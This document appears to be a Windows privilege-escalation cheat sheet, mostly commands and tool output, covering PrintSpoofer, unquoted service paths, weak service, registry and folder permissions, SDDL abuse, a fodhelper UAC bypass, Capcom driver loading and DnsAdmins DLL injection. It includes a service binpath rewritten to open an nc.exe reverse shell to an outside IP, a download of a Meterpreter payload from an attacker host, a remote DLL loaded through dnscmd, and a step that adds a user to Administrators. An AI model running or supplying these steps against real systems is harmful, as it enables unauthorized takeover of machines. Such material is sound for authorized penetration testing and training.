### SeImpersonatePrivilege 
```
whoami /all
whoami /priv
PrintSpoofer.exe -i -c cmd
```



### Unquoted Service Path
There are two type of Unquoted Path Service Privilege Escalation putting the executable file into writtable directory becuase when the operating system is loaded Windows will attempt to find the binary to execute and access resources
in a parent path as a result of path contains space and not enclosed with quotation marks.and replace the executable file with the malicious exe if you have enough permission to relace the original file.

Windows will  try to execute the following files:
C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe
C:\Program.exe
C:\Program Files.exe
C:\Program Files\A Subfolder\b.exe
C:\Program Files\A Subfolder\B Subfolder\c.exe
C:\Program Files\A Subfolder\B Subfolder\C Subfolder\d.exe

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

```



### Weak Service Permission



```
C:\Users\John\Desktop>accesschk64.exe -uwcqv "BUILTIN\Users" *
C:\Users\John\Desktop>accesschk64.exe -uwcqv John *

Accesschk v6.13 - Reports effective permissions for securable objects

RW SNMPTRAP
        SERVICE_ALL_ACCESS

C:\Users\John\Desktop>accesschk64.exe -ucqv SNMPTRAP

SNMPTRAP
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  R  NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  R  NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  RW Everyone
        SERVICE_ALL_ACCESS

SERVICE_NAME: SNMPTRAP
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : net localgroup Administrators John /add
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : SNMP Trap
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
	
sc config SNMPTRAP binpath= "net localgroup Administrators John /add" 
sc config SNMPTRAP binpath= "C:\Users\John\Desktop\nc.exe -nv 192.168.99.91 4444 -e C:\WINDOWS\System32\cmd.exe"	
wmic service NAMEOFSERVICE call startservice
net stop SNMPTRAP && net start SNMPTRAP
```
### WEAK REGISTRY PERMISSIONS

```
accexxchk.exe -kvw MeMe HKLM\SYSTEM\CurrentControlSet\Services\

reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f

sc qc WeakService4
sc stop WeakService4
sc start WeakService4

```
### Weak Folder Permissions 
weak folder permissions granting any user full permission "Everyone: (F)" to the contents of the directory and it's sub-folders. In addition, the program installs a service called "KWSService" which runs as "Localsystem", this will allow any user to escalate privileges to "NT AUTHORITY\SYSTEM" by substituting the service's binary with a malicious one
```
>accesschk64.exe -uwqs "Authenticated Users" c:\*.*
C:\WeakServices\Weak Folder\cmd.exe: The system cannot find the file specified.
Successfully processed 0 files; Failed processing 1 files

C:\Users\John>icacls "C:\WeakServices\Weak Folder"
C:\WeakServices\Weak Folder BUILTIN\Administrators:(I)(OI)(CI)(F)
                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                            BUILTIN\Users:(I)(OI)(CI)(RX)
                            NT AUTHORITY\Authenticated Users:(I)(M)
                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)              
```


### DACLS  ELEVATION OF PRIVILEGE

SDDL (Security Descriptor Definition Language) is used in the nTSecurityDescriptor attribute and on registry keys and NTFS files to define the ACL
SC.EXE command to set modified access controls for the identified services. **Most interesting part is (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD) which Allow any authenticated user to modify the specify service as a System privileged**

### Permissions

* “RC”	Read Permissions	
* “SD”	Delete	
* “WD”	Modify 
* “WO”	Modify
* “RP”	Read All Properties	
* “WP”	Write All Properties	

```
C:\>sc sdshow SNMPTRAP

D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)


C:\> sc sdshow scmanager
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

```
### UAC Bypass
```
[Environment]::Is64BitProcess
dir C:\Windows\System32\fodhelper.exe
Invoke-WebRequest -Uri http://192.168.10.108/Met.exe -Outfile C:\Meterpreter.exe
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell.exe -exec bypass -c C:\Met.exe" -Force
C:\Windows\System32\fodhelper.exe

```


### SeLoadDriverPrivilege for privilege escalation
As of Windows 10 Version 1803, NTLoadDriver seems to forbid references to registry keys under HKEY_CURRENT_USER.
```
 .\EoPLoadDriver.exe System\CurrentControlSet\My_Service C:\Users\Public\Capcom.sys
 .\ExploitCapcom.exe
```

### DnsAdmins
```
Get-NetGroupMember -GroupName "DNSAdmins"
dnscmd <FQDN of DC> /config /serverlevelplugindll \\UNC_path
dnscmd insomnia.io /config /serverlevelplugindll \\192.168.100.100:9090\GiveMe.dll #Hosted At Cobalt
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
sc.exe stop dns
sc.exe start dns
```



* [tarlogic](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [8btc](https://www.8btc.com/article/113116)
* [SDDL Explained] (https://clan8blog.wordpress.com/2016/08/08/sddl-explained/)
* [Sumit Verma] (https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)
